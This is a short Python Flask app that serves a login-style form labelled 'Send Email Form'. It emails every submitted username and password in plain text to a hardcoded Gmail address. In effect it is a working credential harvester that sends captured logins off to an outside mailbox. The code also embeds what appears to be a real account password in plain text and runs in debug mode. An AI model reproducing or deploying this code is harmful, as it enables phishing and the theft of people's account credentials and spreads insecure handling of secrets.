from flask import Flask, request, render_template_string
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# HTML template as a string
html_form = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Email Form</title>
</head>
<body>
    <h2>Send Email Form</h2>
    <form action="/send-email" method="post">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="Send Email">
    </form>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(html_form)

@app.route('/send-email', methods=['POST'])
def send_email():
    username = request.form['username']
    password = request.form['password']

    # Define email parameters
    sender_email = "toateeb09@gmail.com"  # replace with your Gmail address
    receiver_email = "toateeb09@gmail.com"  # replace with your Gmail address
    email_password = "ate__ira0"  # replace with your Gmail password

    # Create the email content
    message = MIMEText(f"Username: {username}\nPassword: {password}")
    message['Subject'] = 'Form Submission'
    message['From'] = sender_email
    message['To'] = receiver_email

    try:
        # Send the email using Gmail's SMTP server
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, email_password)
            server.send_message(message)

        return 'Email sent successfully!'
    except Exception as e:
        print(f"Error: {e}")
        return 'Failed to send email.'

if __name__ == '__main__':
    app.run(debug=True)
